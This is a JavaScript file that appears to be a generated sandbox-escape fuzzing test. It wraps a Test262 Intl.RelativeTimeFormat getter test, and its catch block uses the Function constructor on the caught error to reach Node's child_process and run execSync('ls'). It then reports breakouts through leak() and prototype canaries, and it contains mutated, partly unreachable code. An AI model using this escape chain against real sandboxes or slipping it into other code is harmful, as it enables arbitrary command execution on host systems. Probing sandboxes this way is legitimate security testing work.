try {
    Object.defineProperties(Object.prototype, {
        'localeMatcher': {
            'get': function () {
                let REPLACER = 23;
                throw new Test262Error('Should not call getter on Object.prototype: localeMatcher');
            }
        },
        'minimumIntegerDigits': {
            'get': function () {
                throw () => {
                    return () => {
                    };
                };
                throw new Test262Error('Should not call getter on Object.prototype: minimumIntegerDigits');
            }
        },
        'minimumFractionDigits': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: minimumFractionDigits');
            }
        },
        'maximumFractionDigits': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: maximumFractionDigits');
            }
        },
        'minimumSignificantDigits': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: minimumSignificantDigits');
            }
        },
        'maximumSignificantDigits': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: maximumSignificantDigits');
            }
        },
        'style': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: style');
            }
        },
        'currency': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: currency');
            }
        },
        'currencyDisplay': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: currencyDisplay');
            }
        },
        'useGrouping': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: useGrouping');
            }
        },
        'type': {
            'get': function () {
                throw new Test262Error('Should not call getter on Object.prototype: type');
            }
        }
    });
    new Intl.RelativeTimeFormat();
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}